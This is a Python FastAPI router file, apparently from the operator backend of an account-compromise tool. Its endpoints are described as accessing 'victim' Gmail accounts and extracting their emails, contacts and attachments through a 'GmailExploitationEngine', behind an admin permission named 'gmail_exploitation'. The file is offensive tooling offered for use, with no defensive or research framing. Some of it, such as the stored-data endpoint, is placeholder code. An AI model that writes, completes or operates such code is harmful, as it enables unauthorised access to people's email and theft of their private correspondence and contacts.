"""
Gmail Router
Gmail access and data extraction endpoints
"""

import logging
from datetime import datetime, timezone
from typing import Dict, Any, Optional

from fastapi import APIRouter, HTTPException, status, Request, Depends
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel

from engines.gmail_exploitation import GmailExploitationEngine
from api.auth.jwt_handler import JWTHandler
from api.auth.permissions import PermissionManager

logger = logging.getLogger(__name__)

router = APIRouter()
security = HTTPBearer()

# Initialize managers
gmail_engine = GmailExploitationEngine()
jwt_handler = JWTHandler()
permission_manager = PermissionManager()

# Pydantic models
class GmailAccessRequest(BaseModel):
    victim_id: str
    access_method: str = "oauth"
    extraction_config: Dict[str, Any] = {}

class GmailExtractRequest(BaseModel):
    victim_id: str
    extraction_config: Dict[str, Any] = {
        "extract_emails": True,
        "extract_contacts": True,
        "extract_attachments": True,
        "extract_calendar": False,
        "extract_drive": False
    }

# Dependency to get current admin user
async def get_current_admin(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """Get current admin user from JWT token"""
    try:
        token_data = jwt_handler.decode_token(credentials.credentials)
        return {
            "id": token_data["sub"],
            "username": token_data["username"],
            "role": token_data["role"],
            "permissions": token_data["permissions"]
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid authentication credentials"
        )

@router.post("/access")
async def access_gmail(
    request: GmailAccessRequest,
    admin_user: dict = Depends(get_current_admin)
):
    """Access victim Gmail account"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        # Access Gmail
        gmail_session = await gmail_engine.access_victim_gmail(
            victim_id=request.victim_id,
            admin_user_id=admin_user["id"],
            access_method=request.access_method
        )

        return {
            "success": True,
            "gmail_session": gmail_session,
            "message": "Gmail access established successfully"
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Gmail access error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.post("/extract")
async def extract_gmail_data(
    request: GmailExtractRequest,
    admin_user: dict = Depends(get_current_admin)
):
    """Extract data from victim Gmail account"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        # First access Gmail
        gmail_service = await gmail_engine.access_victim_gmail(
            victim_id=request.victim_id,
            admin_user_id=admin_user["id"],
            access_method="oauth"
        )

        # Extract intelligence
        extraction_results = await gmail_engine.extract_gmail_intelligence(
            gmail_service=gmail_service,
            victim_id=request.victim_id,
            extraction_config=request.extraction_config
        )

        return {
            "success": True,
            "extraction_results": extraction_results,
            "message": "Gmail data extraction completed successfully"
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Gmail extraction error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.get("/data/{victim_id}")
async def get_extracted_gmail_data(
    victim_id: str,
    admin_user: dict = Depends(get_current_admin)
):
    """Get previously extracted Gmail data"""
    try:
        # Check permissions
        if not permission_manager.has_permission(admin_user, "gmail_exploitation"):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions"
            )

        # Get extracted data (this would need to be implemented in the engine)
        # For now, return placeholder
        return {
            "victim_id": victim_id,
            "extraction_status": "completed",
            "data_types": ["emails", "contacts", "attachments"],
            "last_extracted": datetime.now(timezone.utc).isoformat()
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get Gmail data error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )

@router.get("/health")
async def gmail_health_check():
    """Health check for Gmail services"""
    try:
        # Check if Gmail engine is healthy
        health_status = {
            "gmail_engine": True,  # Simplified health check
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        return {
            "status": "healthy",
            "services": health_status
        }

    except Exception as e:
        logger.error(f"Gmail health check error: {e}")
        return {
            "status": "unhealthy",
            "error": str(e),
            "timestamp": datetime.now(timezone.utc).isoformat()
        }